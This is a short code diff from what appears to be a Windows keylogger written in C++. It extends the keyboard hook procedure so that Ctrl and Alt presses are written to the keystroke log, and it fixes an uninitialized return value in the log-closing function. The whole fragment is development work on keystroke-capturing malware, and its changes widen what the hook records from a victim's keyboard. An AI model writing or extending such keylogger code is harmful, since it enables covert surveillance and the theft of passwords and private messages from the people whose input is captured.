@@ -47,6 +47,8 @@ LRESULT OurKeyBoardProc(Keylogger* KeyloggerObj, int nCode, WPARAM wparam, LPARA
 			case VK_RETURN:		KeyloggerObj->WriteLog(L"[Enter]\r\n");		break;
 			case VK_TAB:		KeyloggerObj->WriteLog(L"[Tab]");			break;
 			case VK_BACK:		KeyloggerObj->WriteLog(L"[Backspace]");		break;
+			case VK_CONTROL:	KeyloggerObj->WriteLog(L"[Ctrl]");			break;
+			case VK_MENU:		KeyloggerObj->WriteLog(L"[Alt]");			break;
 
 			default:
 				{
@@ -112,7 +114,7 @@ bool Keylogger::WriteLog(WCHAR* text)
 
 bool Keylogger::CloseLog()
 {
-	bool ret;
+	bool ret = false;
 	if (hLog)
 	{
 		ret = CloseHandle(hLog);
